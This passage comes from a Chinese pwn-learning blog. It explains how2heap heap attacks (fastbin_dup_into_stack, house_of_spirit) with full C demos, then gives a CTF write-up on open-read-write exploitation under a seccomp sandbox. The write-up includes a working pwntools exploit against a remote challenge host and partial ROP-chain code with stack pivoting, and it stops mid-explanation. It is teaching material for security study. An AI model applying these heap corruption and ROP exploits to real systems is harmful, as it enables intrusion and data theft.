<h2 id="3-再次分配三个chunk"><a href="#3-再次分配三个chunk" class="headerlink" title="3.再次分配三个chunk"></a>3.再次分配三个chunk</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = calloc(1, 8);</span><br><span class="line">b = calloc(1, 8);</span><br><span class="line">c = calloc(1, 8);</span><br></pre></td></tr></table></figure>
<p>然后依次分配三个chunk，观察堆结构和bins的变化</p>
<p>第一次分配chunk，将fastbins链表头部的元素0x555555559390分配给了变量a <strong>（说明fastbins是LIFO——后进先出）</strong>，并且fastbins链表中还有0x555555559390，所以尽管这个chunk已经被分配了，但它依然被标记为了free，意味着也就能被再次分配给其他变量。<br><img src="/images/p4/image-12.png" alt="a = calloc(1, 8);"></p>
<p>第二次分配chunk，这时候链表某端的地址是0x5555555593b0，所以它被分配给了b，此时链表中就剩下最后的0x555555559390<br><img src="/images/p4/image-13.png" alt="b = calloc(1, 8);"></p>
<p>第三次分配chunk，将链表某端的0x555555559390再次分配给了变量c<br><img src="/images/p4/image-14.png" alt="c = calloc(1, 8);"></p>
<p>也就有了两个指向同一块内存区域的指针。<br><img src="/images/p4/image-16.png"></p>
<p>当我修改指针c的值时，指针a的值也会被修改<br><img src="/images/p4/image-17.png"></p>
<hr>
<h1 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h1><p>扩展fastbin_dup.c，演示malloc返回一个指向栈上空间的指针。</p>
<h2 id="fastbin-dup-into-stack-c-源代码"><a href="#fastbin-dup-into-stack-c-源代码" class="headerlink" title="fastbin_dup_into_stack.c 源代码"></a>fastbin_dup_into_stack.c 源代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	//首先填满tcache</span><br><span class="line">    void *ptrs[7];</span><br><span class="line">    for (int i=0; i&lt;7; i++) &#123;</span><br><span class="line">		ptrs[i] = malloc(8);</span><br><span class="line">	&#125;</span><br><span class="line">	for (int i=0; i&lt;7; i++) &#123;</span><br><span class="line">		free(ptrs[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	unsigned long stack_var[4] __attribute__ ((aligned (0x10)));</span><br><span class="line">    stack_var[1] = 0x20;</span><br><span class="line">    fprintf(stderr, &quot;栈上创建一个数组，数组地址为%p，写入0x20（用于伪造的chunk size字段）\n&quot;,stack_var);</span><br><span class="line">    fprintf(stderr, &quot;我们想通过 malloc 申请到 %p.\n&quot;, stack_var+2);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;1. 分配3个chunk。\n&quot;);</span><br><span class="line">	int *a = calloc(1,8);</span><br><span class="line">	int *b = calloc(1,8);</span><br><span class="line">	int *c = calloc(1,8);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;第一次calloc(1,8): %p\n&quot;, a);</span><br><span class="line">	fprintf(stderr, &quot;第二次calloc(1,8): %p\n&quot;, b);</span><br><span class="line">	fprintf(stderr, &quot;第三次calloc(1,8): %p\n&quot;, c);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;2. 依次free a,b,a 的chunk，暴露double free漏洞\n&quot;);</span><br><span class="line">	free(a);</span><br><span class="line">	free(b);</span><br><span class="line">	free(a);</span><br><span class="line">	fprintf(stderr, &quot;现在fastbins链表为 [ %p, %p, %p ]。\n&quot;, a, b, a);</span><br><span class="line"></span><br><span class="line">    fprintf(stderr, &quot;3. 分配两个chunk\n&quot;);</span><br><span class="line">    unsigned long *d = calloc(1,8);</span><br><span class="line">	fprintf(stderr, &quot;第一次calloc(1,8): %p\n&quot;, d);</span><br><span class="line">	fprintf(stderr, &quot;第二次calloc(1,8): %p\n&quot;, calloc(1,8));</span><br><span class="line">	fprintf(stderr, &quot;现在fastbins链表为 [ %p ]。\n&quot;, a);</span><br><span class="line">	fprintf(stderr, &quot;现在，我们修改第一次malloc的%p，就会同时修改fastbins中的头部元素中fd的值\n&quot;, d);</span><br><span class="line">	fprintf(stderr, &quot;覆盖 %p 的内容——stack_var的地址，fastbins中头部元素的fd字段同时也会填入相同的内容。\n&quot;, d);</span><br><span class="line">	unsigned long ptr = (unsigned long)stack_var;</span><br><span class="line">	unsigned long addr = (unsigned long) d;</span><br><span class="line">	*d = (addr &gt;&gt; 12) ^ ptr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;第三次calloc(1,8): %p，将栈地址放入fastbins链表中\n&quot;, calloc(1,8));</span><br><span class="line"></span><br><span class="line">	void *p = calloc(1,8);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;第四次calloc(1,8): %p\n，发现这一次malloc的空间在栈上！\n&quot;, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>编译运行结果<br><img src="/images/p4/image-21.png"></p>
<h2 id="0-布置栈结构"><a href="#0-布置栈结构" class="headerlink" title="0. 布置栈结构"></a>0. 布置栈结构</h2><p>栈上创建一个数组，在第二个元素写入0x20</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned long stack_var[4] __attribute__ ((aligned (0x10)));</span><br><span class="line">stack_var[1] = 0x20;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>C语言内存对齐与attribute选项介绍<a href="https://blog.csdn.net/21aspnet/article/details/6729724">https://blog.csdn.net/21aspnet/article/details/6729724</a></p>
</blockquote>
<p>这样我们在栈上就有了这样的一块空间，fastbin_dup_into_stack想要将malloc的空间指向stack_var[2]。<br><img src="/images/p4/image-25.png"></p>
<h2 id="1-分配3个chunk"><a href="#1-分配3个chunk" class="headerlink" title="1. 分配3个chunk"></a>1. 分配3个chunk</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int *a = calloc(1,8);</span><br><span class="line">int *b = calloc(1,8);</span><br><span class="line">int *c = calloc(1,8);</span><br></pre></td></tr></table></figure>
<p>画一下堆栈图<br><img src="/images/p4/image-34.png"></p>
<h2 id="2-依次free-a-b-a-的chunk"><a href="#2-依次free-a-b-a-的chunk" class="headerlink" title="2. 依次free a,b,a 的chunk"></a>2. 依次free a,b,a 的chunk</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">free(a);</span><br><span class="line">free(b);</span><br><span class="line">free(a);</span><br></pre></td></tr></table></figure>
<p>看一下程序依次释放完chunk a,b,c后，堆结构和fastbins的情况<br><img src="/images/p4/image-22.png"></p>
<p>此时的堆栈图（fastbins通过fd指针找到下一个free chunk）<br><img src="/images/p4/image-45.png"></p>
<h2 id="3-分配两个chunk"><a href="#3-分配两个chunk" class="headerlink" title="3. 分配两个chunk"></a>3. 分配两个chunk</h2><p>分配两个chunk,将第一个malloc chunk 标记为d的chunk，第二个不用管</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned long *d = calloc(1,8);</span><br><span class="line">calloc(1,8)</span><br></pre></td></tr></table></figure>
<p>那么，fastbins中就剩下a的chunk了<br><img src="/images/p4/image-23.png"><br>此时的堆栈图<br><img src="/images/p4/image-40.png"></p>
<h2 id="ATTACK"><a href="#ATTACK" class="headerlink" title="ATTACK"></a>ATTACK</h2><p>此时，d分配到的chunk其实是之前a的chunk，<strong>而fastbins中我们的a还在的！所以当我们对d写入数据时，fastbins中的值也会被覆盖 （我们想要覆盖free chunk的fd指针）</strong></p>
<p>既然我们想要malloc到栈上stack_var[2]的地址，我们的第一个想法只要fastbins中free chunk 的fd指针指向stack_var[2]就可以了<br>但这样离成功还差一步，因为正常来讲fd指针指向的是chunk的开头，也就是prev size字段，而不是数据段开头，所以我们fd指针要指向stack_var[0]的地址，也就是stack_var<br>我们的栈空间被malloc得到的chunk预想应该是这样的<br><img src="/images/p4/image-42.png"></p>
<p><strong>向d中写入的data就是fastbins中a chunk的fd字段</strong>，所以现在覆盖前 8 字节，修改 fd 指针指向stack_var</p>
<blockquote>
<p>在glibc 2.32之前，我们只需要这样的代码，就可以修改d的data字段值为stack_var的地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*d = stack_var;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>但是2.32更新了一个叫<a href="https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive">“Safe-Linking”（安全链接）</a>的保护机制，<br>这篇博客的重点不在这里，现在只需要知道我们要通过下述代码写入d chunk data段的前八个字节，从而覆盖fd指针</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned long ptr = (unsigned long)stack_var;</span><br><span class="line">unsigned long addr = (unsigned long) d;</span><br><span class="line">*d = (addr &gt;&gt; 12) ^ ptr;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>这样一来，fastbins中的a chunk的fd指针就指向了stack_var<br><img src="/images/p4/image-44.png"></p>
<p><img src="/images/p4/image-50.png" alt="fastbins中多了一个栈空间上的元素"></p>
<p>我们把fastbins中的a分配出去，stack_var来到fastbins的头部，此时堆管理器认为fastbins中还有一个free chunk，而这个“chunk”其实在栈上<br><img src="/images/p4/image-46.png"><br><img src="/images/p4/image-51.png" alt="此时的fastbins"><br><img src="/images/p4/image-52.png" alt="看到chunk a和 chunk d是同一个chunk"></p>
<p>这时候为p变量 malloc一块空间，就会申请到fastbins指向的栈上的stack_var的一块0x20大小的空间<br><img src="/images/p4/image-53.png" alt="查看p变量的地址"><br><img src="/images/p4/image-54.png"><br>至此，我们攻击了堆，让malloc返回了一个指向栈上空间的指针</p>
<hr>
<h1 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h1><p>演示 House of Spirit 攻击，该攻击通过将非堆地址加入 fastbins，导致任意地址写操作。</p>
<h2 id="house-of-spirit-c-源代码"><a href="#house-of-spirit-c-源代码" class="headerlink" title="house_of_spirit.c 源代码"></a>house_of_spirit.c 源代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	setbuf(stdout, NULL); // 禁用缓冲区，确保输出按顺序显示</span><br><span class="line"></span><br><span class="line">	//填满 tcache</span><br><span class="line">	void *chunks[7];</span><br><span class="line">	for (int i = 0; i &lt; 7; i++) &#123;</span><br><span class="line">		chunks[i] = malloc(0x30); </span><br><span class="line">	&#125;</span><br><span class="line">	for (int i = 0; i &lt; 7; i++) &#123;</span><br><span class="line">		free(chunks[i]); </span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	puts(&quot;1: 准备 fake chunk。&quot;);</span><br><span class="line">	long fake_chunks[10] __attribute__ ((aligned (0x10))); // 16 字节对齐</span><br><span class="line">	printf(&quot;fake chunk 的地址是 %p\n&quot;, fake_chunks);</span><br><span class="line">	printf(&quot;fake chunk 包含两个 chunk。第一个 chunk 的起始地址为 %p，第二个 chunk 的起始地址为 %p。\n&quot;, &amp;fake_chunks[1], &amp;fake_chunks[9]);</span><br><span class="line">	printf(&quot;将第一个 fake chunk 的大小（%p）设置为 0x40，这样 malloc 会认为它是一个有效 chunk。\n&quot;, &amp;fake_chunks[1]);</span><br><span class="line">	fake_chunks[1] = 0x40; </span><br><span class="line"></span><br><span class="line">	printf(&quot;将下一个 fake chunk 的大小（%p）设置为 0x1234，这样free第一个 fake chunk 时可以通过检查。\n&quot;, &amp;fake_chunks[9]);</span><br><span class="line">	fake_chunks[9] = 0x1234; </span><br><span class="line"></span><br><span class="line">	puts(&quot;2: 释放第一个 fake chunk&quot;);</span><br><span class="line">	void *victim = &amp;fake_chunks[2];</span><br><span class="line">	free(victim); </span><br><span class="line"></span><br><span class="line">	puts(&quot;3: malloc fake chunk&quot;);</span><br><span class="line">	printf(&quot;接下来calloc 会返回我们的 fake chunk，地址为 %p！\n&quot;, &amp;fake_chunks[2]);</span><br><span class="line">	void *allocated = calloc(1, 0x30);</span><br><span class="line">	printf(&quot;malloc(0x30): %p, fake chunk: %p\n&quot;, allocated, victim);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>编译运行<br><img src="/images/p4/image-55.png"></p>
<h2 id="0-原理"><a href="#0-原理" class="headerlink" title="0. 原理"></a>0. 原理</h2><p>House Of Spirit将任意地址加入到 fastbins 中，从而malloc 到指定地址的 chunk。</p>
<p>House Of Spirit和 fastbin_dup 的区别是：</p>
<ul>
<li>fastbin_dup中free的chunk是程序自己malloc产生的，free时chunk就会进入fastbins链表中</li>
<li>house of spirit中free的chunk不是程序自己产生的，而是我们指定的一块内存空间”fake chunk”，free这个chunk让他进入fastbins</li>
</ul>
<p>一个chunk在被free之后归到fastbins之前会有一些检查，检查通过才会被加到fastbins中，所以我们要做一些努力，让程序相信这个fake chunk是合法的chunk：</p>
<ol>
<li>fake chunk 的 M 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li>
<li>fake chunk 地址内存对齐：32位0xXXXX0或0xXXXX4；64位0xXXXX0或0xXXXX8</li>
<li>fake chunk 的 size大小需要满足对应的 fastbin 的需求，同时也得对齐。</li>
<li>fake chunk 的 next chunk size不能小于 2 * SIZE_SZ，同时不能大于av-&gt;system_mem</li>
<li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li>
</ol>
<h2 id="1-构造-fake-chunk"><a href="#1-构造-fake-chunk" class="headerlink" title="1. 构造 fake chunk"></a>1. 构造 fake chunk</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">long fake_chunks[10] __attribute__ ((aligned (0x10))); // 16 字节对齐</span><br><span class="line">fake_chunks[1] = 0x40; </span><br><span class="line">fake_chunks[9] = 0x1234; </span><br></pre></td></tr></table></figure>
<p>在栈上准备我们的fake chunk<br><img src="/images/p4/image-57.png"></p>
<blockquote>
<p>对于fake chunk的M位，fake_chunks[1] &#x3D; 0x40; 就保证了AMP位均为0。<br>通过__attribute__保证了内存字节对齐<br>fake_chunks[9] &#x3D; 0x1234满足对next chunk 的检查</p>
</blockquote>
<h2 id="2-释放-fake-chunk"><a href="#2-释放-fake-chunk" class="headerlink" title="2. 释放 fake chunk"></a>2. 释放 fake chunk</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void *victim = &amp;fake_chunks[2];</span><br><span class="line">free(victim);</span><br></pre></td></tr></table></figure>
<p>释放fake chunk，可以看到精心构造的fake chunk成功绕过了检查，进入了fastbins中<br><img src="/images/p4/image-58.png"></p>
<h2 id="3-malloc-fake-chunk"><a href="#3-malloc-fake-chunk" class="headerlink" title="3. malloc fake chunk"></a>3. malloc fake chunk</h2><p>既然fastbins中存在我们的fake chunk，那么malloc 适当大小的chunk时，我们就能获得这个chunk了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void *allocated = calloc(1, 0x30);</span><br></pre></td></tr></table></figure>
<p><img src="/images/p4/image-60.png" alt="allocated 分配到的内存地址就是victim的地址"></p>
]]></content>
      <categories>
        <category>pwn学习</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>堆利用</tag>
        <tag>how2heap</tag>
        <tag>fastbin_dup</tag>
        <tag>fastbin_dup_into_stack</tag>
        <tag>house_of_spirit</tag>
      </tags>
  </entry>
  <entry>
    <title>栈上ORW学习总结</title>
    <url>/2024/11/12/%E6%A0%88%E4%B8%8AORW%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="前置知识：沙箱保护和ORW"><a href="#前置知识：沙箱保护和ORW" class="headerlink" title="前置知识：沙箱保护和ORW"></a>前置知识：沙箱保护和ORW</h1><h2 id="沙箱保护-SandBox"><a href="#沙箱保护-SandBox" class="headerlink" title="沙箱保护 SandBox"></a>沙箱保护 SandBox</h2><p>正常情况下，程序可以使用所有的syscall，但其实这是不安全的，我们可以劫持程序流后通过execve的syscall来getshell。<br>如果不想让程序去执行execve，我们可以这样做：将程序放入一个沙箱中，在这个沙箱中添加一条规则——禁用execve函数。在这个沙箱中的程序只要调用了execve的系统调用，直接给他中断掉，这就是沙箱sandbox的作用。</p>
<p>SandBox的实现一般有两种，一种是<a href="https://www.cnblogs.com/L0g4n-blog/p/12839171.html">seccomp()函数调用</a>，另一种是<a href="https://blog.csdn.net/qq_44846324/article/details/121731640">prctl()函数调用</a></p>
<span id="more"></span>

<h2 id="沙箱检测"><a href="#沙箱检测" class="headerlink" title="沙箱检测"></a>沙箱检测</h2><p>首先安装seccomp-tools</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install gcc ruby-dev</span><br><span class="line">sudo gem install seccomp-tools</span><br></pre></td></tr></table></figure>
<p>工具用法：seccomp-tools dump “程序”<br><img src="/images/p2/image-1.png"><br>可以看到程序如果调用了execve或execveat，会跳转到0004，然后被KILL掉，也就是程序禁用了execve和execveat <strong>（system函数实质上也是调用了execve函数，所以也禁用了system函数）</strong> </p>
<h2 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h2><p>想想我们以前是怎么拿到flag的？我们是先get shell，然后在shell中去执行我们想要的操作（cat &#x2F;flag），但如果程序禁用了execve，能不能跳过get shell的步骤，去直接拿到flag呢？</p>
<p>这就是ORW（open,read,write）的攻击方式：open打开目标的flag文件，read读取flag文件，write显示flag文件的内容。</p>
<p><strong>open()：打开文件</strong></p>
<blockquote>
<p>函数原型：int open(char <em>path,int access);<br>char <em>path——要打开的包含路径的文件名<br>int access——打开方式(只读模式、只写模式 、读写模式)——**设为0-只读模式</em></em><br>返回值： 成功  返回fd ，失败  返回-1</p>
</blockquote>
<p><strong>read()：读取文件内容</strong></p>
<blockquote>
<p>函数原型： int read(int fd,void <em>buf,int len);<br>int fd——文件描述符——*<em>设为open的返回值fd，一般为3，表示从打开的文件中读取内容</em></em><br>void *buf——为要将读取的内容保存的缓冲区<br>int len——读取文件的长度<br>返回值：返回实际读取的字节数</p>
</blockquote>
<p><strong>write()：写文件</strong></p>
<blockquote>
<p>函数原型： int write(int fd,void <em>buf,int len);<br>int fd——文件描述符——*<em>设为1,表示写</em></em><br>void *buf——要写入的内容<br>int len——要写入的长度<br>返回值：返回实际写入文件内容的长度</p>
</blockquote>
<p>栈上的orw根据利用方式分为orw_shellcode型和orw_ROP型，通过两个例题入手</p>
<h1 id="例1：ORW-shellcode-极客大挑战-2019-Not-Bad"><a href="#例1：ORW-shellcode-极客大挑战-2019-Not-Bad" class="headerlink" title="例1：ORW_shellcode [极客大挑战 2019]Not Bad"></a>例1：ORW_shellcode [极客大挑战 2019]Not Bad</h1><blockquote>
<p>题目链接：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
</blockquote>
<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>checksec;file，64位，保护全关——没有开NX保护，可以在栈上写shellcode<br><img src="/images/p2/image-2.png"><br>IDA里面看到有三个函数，并在0x123000处开辟了0x1000的<strong>可写可执行</strong>的空间<br><img src="/images/p2/image-3.png"></p>
<p>第一个函数开启了seccomp函数，将他重命名为seccomp_init</p>
<p><img src="/images/p2/image-4.png"><br>第二个函数是设置缓存区，不用管<br><img src="/images/p2/image-5.png"><br>第三个函数就是我们的vuln函数了，buf这里可以看到一个明显的栈溢出，溢出长度为0x18字节<br><img src="/images/p2/image-6.png"></p>
<p>另外我们找到了一个 jmp rsp 汇编指令的地址，这个jmp rsp到底有什么用呢？我们在后面讲一下<br><img src="/images/p2/image-7.png"><br>既然开启了沙箱保护，那我们就用seccomp-tools看一下，可以看到函数允许了open,write,read函数，可以通过ORW的方式去获取到flag的内容<br><img src="/images/p2/image-8.png"></p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>溢出的长度只有0x18，是不够我们写入shellcode的，但是mmap为我们在0x123000开始的位置提供了很大一片空间，那么就可以用read函数在这块空间写入我们的shellcode（shellcode写什么？当然是open打开flag、read写入flag、write输出flag）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mmap = 0x123000</span><br><span class="line">orw = shellcraft.open(&#x27;./flag&#x27;)        </span><br><span class="line">orw+ = shellcraft.read(3,mmap,0x100)      </span><br><span class="line">orw+ = shellcraft.write(1,mmap,0x100)</span><br><span class="line">payload = cyclic(0x20+8) + asm(shellcraft.read(0,mmap,0x100))</span><br></pre></td></tr></table></figure>
<p>这样send(payload)之后我们再send(orw)，就向mmap的空间写入了我们的shellcode，但是接下来的问题就是如何跳转到这里执行shellcode。这里就可以讲一下jmp rsp的作用</p>
<h2 id="jmp-rsp到底有什么用呢？"><a href="#jmp-rsp到底有什么用呢？" class="headerlink" title="jmp rsp到底有什么用呢？"></a>jmp rsp到底有什么用呢？</h2><p>调试看一下正常情况的vuln函数结束前后的栈结构，在leave;ret之前rsp的地址为0xddc0<br><img src="/images/p2/image-9.png"><br>leave，将rsp移到了rbp并+8<br><img src="/images/p2/image-10.png"><br>ret，rsp再+8<br><img src="/images/p2/image-11.png"><br>总的来说，rsp从0xddc0的位置来到了0xddf0的位置，想象一下如果我们将ret覆盖为 jmp rsp ，会怎么样呢？因为rsp现在来到了0xddf0，所以rip会指向0xddf0。<br>那么我们就知道该如何进行跳转了，把填充垃圾数据的部分利用起来，看看下边右图的栈结构<br><img src="/images/p2/image-12.png"><br>在栈顶写入read(0,mmap,0x100);mov rax;0x123000;call rax，填充垃圾数据，然后将ret覆盖为jmp esp，那么rip重新指向现在的rsp的值，接下来rsp-0x30（0x30&#x3D;填充的0x28+rsp自增的8），回到绿色的那两行，这两行用来做什么的？向read读入我们的orw，并且call调用它</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = asm(shellcraft.read(0,mmap,0x100)) +asm(&#x27;mov r15,0x123000;call r15&#x27;)</span><br><span class="line">payload = payload.ljust(0x28,b&#x27;\x90&#x27;)</span><br><span class="line">payload += p64(jmp_rsp) + asm(&#x27;sub rsp,0x30;jmp rsp&#x27;)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>其实call rax和jmp rax都可以，区别如下：<br>call会把他的下一条指令的地址压入堆栈，然后跳转到他调用的开始处，同时ret会自动弹出返回地址。<br>JMP只是简单的跳转<br>call的本质相当于push+jmp  ret的本质相当于pop+jmp</p>
</blockquote>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">io = remote(&#x27;node5.buuoj.cn&#x27;,28895)</span><br><span class="line">elf = ELF(&#x27;./bad&#x27;)</span><br><span class="line">jmp_rsp = 0x400A01</span><br><span class="line">mmap = 0x123000</span><br><span class="line">orw = shellcraft.open(&#x27;./flag&#x27;)</span><br><span class="line">orw += shellcraft.read(3,mmap,0x100)</span><br><span class="line">orw += shellcraft.write(1,mmap,0x100)</span><br><span class="line">orw = asm(orw)</span><br><span class="line">payload = asm(shellcraft.read(0,mmap,0x100)) +asm(&#x27;mov r15,0x123000;call r15&#x27;)</span><br><span class="line">payload = payload.ljust(0x28,b&#x27;\x90&#x27;)</span><br><span class="line">payload += p64(jmp_rsp) + asm(&#x27;sub rsp,0x30;jmp rsp&#x27;)</span><br><span class="line">io.recvline()</span><br><span class="line">io.send(payload)</span><br><span class="line">io.send(orw)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="例2：ORW-ROP-HGAME-2023-week1-orw"><a href="#例2：ORW-ROP-HGAME-2023-week1-orw" class="headerlink" title="例2：ORW_ROP [HGAME 2023 week1] orw"></a>例2：ORW_ROP [HGAME 2023 week1] orw</h1><blockquote>
<p>题目链接：<a href="https://www.nssctf.cn/problem/3489">https://www.nssctf.cn/problem/3489</a></p>
</blockquote>
<h2 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h2><p>先把ld和libc链接到程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kuban@kuban-virtual-machine:~/Desktop/pwn/test/orw$ patchelf --set-interpreter /home/kuban/Desktop/pwn/test/orw/ld-2.31.so vuln </span><br><span class="line">kuban@kuban-virtual-machine:~/Desktop/pwn/test/orw$ patchelf --replace-needed libc.so.6 /home/kuban/Desktop/pwn/test/orw/libc-2.31.so vuln</span><br><span class="line">kuban@kuban-virtual-machine:~/Desktop/pwn/test/orw$ ldd vuln </span><br><span class="line">        linux-vdso.so.1 (0x00007fff70b25000)</span><br><span class="line">        /home/kuban/Desktop/pwn/test/orw/libc-2.31.so (0x000076c7d729c000)</span><br><span class="line">        /home/kuban/Desktop/pwn/test/orw/ld-2.31.so =&gt; /lib64/ld-linux-x86-64.so.2 (0x000076c7d7490000)</span><br></pre></td></tr></table></figure>

<p>checksec;file，64位，开启NX保护<br><img src="/images/p2/image-13.png"><br>IDA里面看一下<br>main函数开启了一个沙箱，输出一行后调用vuln函数<br><img src="/images/p2/image-14.png"><br>vuln函数就是一个非常简单的栈溢出，溢出长度有0x30个字节<br><img src="/images/p2/image-15.png"><br>检测一下沙箱，可以看到函数禁用了execve函数<br><img src="/images/p2/image-16.png"><br>记录一下gadget<br><img src="/images/p2/image-17.png"></p>
<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>这道题主要有四个问题需要解决</p>
<ol>
<li><p>禁用了execve<br>解决方法：当然是orw啦</p>
</li>
<li><p>程序没有open、write函数<br>解决方法：用puts泄露libc，在libc中找到open,write并且返回到vuln函数继续下一步的利用</p>
</li>
<li><p>栈溢出长度只有0x28，不够写入ROP链<br>解决方法：利用leave_ret gadget将栈迁移到bss段<br><img src="/images/p2/image-18.png"></p>
</li>
<li><p>我们open之后，read和write要用到rdi,rsi和rdx三个寄存器传参，可是我们没有控制rdx的gadget？<br>解决办法：使用libc里面的rsi和rdx，libc_base+[libc_rsi&#x2F;rdx] 就可以了（具体看一下exp应该就懂了）<br><img src="/images/p2/image-19.png"></p>
<blockquote>
<p>其实对于问题3，我们也可以在libc中找到pop rsp的指令实现栈迁移，大家伙儿感兴趣可以试试</p>
</blockquote>
</li>
</ol>
<p>那么我们就可以分三步走<br>第一步：泄露libc，找到open,write并且返回到vuln函数，为第二步中read的buf迁移做准备。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop_rdi = 0x401393</span><br><span class="line">ret = 0x40101a</span><br><span class="line">leave_ret = 0x4012be</span><br><span class="line">libc_dump_rsi = 0x2601f</span><br><span class="line">libc_dump_rdx = 0x142c92</span><br><span class="line"></span><br><span class="line">payload1 = cyclic(0x100+8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)</span><br><span class="line">io.sendafter(&#x27;before you try to solve this task.&#x27;,payload1)</span><br><span class="line">puts_addr = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">success(hex(puts_addr))</span><br></pre></td></tr></table></figure>
<p>计算libc基地址，写出目标中我们需要的函数和gadget的地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;]</span><br><span class="line">open_addr = libc_base + libc.symbols[&#x27;open&#x27;]</span><br><span class="line">read_addr = libc_base + libc.symbols[&#x27;read&#x27;] # read_addr = elf.plt[&#x27;read&#x27;]</span><br><span class="line">write_addr = libc_base + libc.symbols[&#x27;write&#x27;]</span><br><span class="line">pop_rsi = libc_base + libc_dump_rsi</span><br><span class="line">pop_rdi = libc_base + libc_dump_rdi</span><br></pre></td></tr></table></figure>

<p>第二步：第一步完成后程序回到了vuln函数即将执行read(0, buf, 0x130uLL); 看一下汇编，可以看到这个read 写入的位置在 rbp-0x100 的位置<br><img src="/images/p2/image-20.png"></p>
<p>我们想要向bss段写入我们的orw，那么我们可以将rbp迁移到newrbp&#x3D;bss+0x200的位置，read就会向newrbp-0x100的位置写入数据了，我们的payload2这样构造</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">newrbp = elf.bss(0x200)</span><br><span class="line">payload2 = cyclic(0x100) + p64(newrbp) + p64(?)</span><br></pre></td></tr></table></figure>

<p>返回地址填什么？填vuln就错了，我们得直接去找到执行read(0, buf, 0x130uLL)的指令，才能向newrbp-0x100的位置写入ROP<br><img src="/images/p2/image-21.png"></p>
<p>这个指令在0x4012CF，我们可以写成vuln+0xF</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">newrbp = elf.bss(0x200)</span><br><span class="line">payload2 = cyclic(0x100) + p64(newrbp) + p64(vuln_addr + 0xF)</span><br><span class="line">io.sendline(payload2)</span><br></pre></td></tr></table></figure>

<p>第三步：现在就是往我们的newbrp-0x100的位置写入flag和orw(flag)，最后将rbp覆盖为bss，返回地址覆盖为leave_ret，完成栈的迁移，执行ROP</p>
